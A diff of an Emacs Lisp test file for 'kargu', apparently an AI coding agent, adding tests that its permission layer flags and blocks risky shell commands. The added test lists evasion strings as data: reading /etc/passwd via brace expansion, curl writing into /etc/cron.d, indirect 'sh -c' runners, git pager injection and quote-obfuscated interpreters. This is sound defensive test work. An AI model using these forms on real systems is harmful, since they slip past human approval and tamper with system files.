@@ -12,17 +12,6 @@
 
 ;;; Code:
 
-(eval-and-compile
-  (let ((root (locate-dominating-file
-               (or (bound-and-true-p byte-compile-current-file)
-                   load-file-name
-                   buffer-file-name
-                   default-directory)
-               "kargu.el")))
-    (when root
-      (add-to-list 'load-path (file-name-as-directory
-                               (expand-file-name root))))))
-
 (require 'tests/test-helpers)
 (require 'ert)
 (require 'kargu)
@@ -92,6 +81,22 @@
                  "xargs cat < list.txt"))
     (should (kargu-permission-command-risks cmd))))
 
+(ert-deftest kargu-permission-indirect-shell-syntax-requires-approval-test ()
+  "Hidden paths and indirect command runners cannot use the confirmation opt-out."
+  (let ((kargu-permission-confirm-bash nil)
+        (kargu-permission--mock-decision nil))
+    (dolist (command '("cat {/etc/passwd,}" "curl -o/etc/cron.d/test https://example.invalid"
+                       "NAME=value python3 -c 'pass'" "python3.12 -c 'pass'"
+                       "busybox sh -c 'pass'" "find . -exec sh -c 'pass' \\;"
+                       "git -c core.pager=payload log" "'python3' -c 'pass'"
+                       "py\"\"thon3 -c 'pass'" "cat .\\./outside"
+                       "curl '--output=/etc/kargu-test' https://example.invalid"))
+      (let ((risks (kargu-permission-command-risks command)))
+        (should risks)
+        (should-not (kargu-permission-request-approval command default-directory risks)))))
+  (should-error (kargu-permission-validate-command "curl -o/etc/kargu-test"))
+  (should-error (kargu-permission-validate-command "curl '--output=/etc/kargu-test'")))
+
 (ert-deftest kargu-permission-plain-commands-have-no-risk-test ()
   "Ordinary build and search commands do not raise the risk flag."
   (dolist (cmd '("git status" "make -j4" "grep -r 'kargu' ." "python -m pytest"
@@ -153,10 +158,11 @@
 (ert-deftest kargu-git-changes-need-approval-test ()
   "commit, stage, stash and branch changes are rejected when not approved."
   (let ((kargu-permission--mock-decision :reject))
-    (should-error (kargu-git-commit #'ignore "msg"))
-    (should-error (kargu-git-stage #'ignore "kargu.el"))
+    (should (string-prefix-p "ERROR:" (kargu-test-await (lambda (done) (kargu-git-commit done "msg")))))
+    (should (string-prefix-p "ERROR:" (kargu-test-await (lambda (done) (kargu-git-stage done "kargu.el")))))
     (should-error (kargu-git-stash #'ignore "drop"))
-    (should-error (kargu-git-branch #'ignore "create" "kargu-test-branch"))))
+    (should (string-prefix-p "ERROR:" (kargu-test-await (lambda (done) (kargu-git-stash done "push")))))
+    (should (string-prefix-p "ERROR:" (kargu-test-await (lambda (done) (kargu-git-branch done "create" "kargu-test-branch")))))))
 
 (ert-deftest kargu-webfetch-refuses-local-addresses-test ()
   "Loopback, private and link-local hosts are refused; public hosts pass."
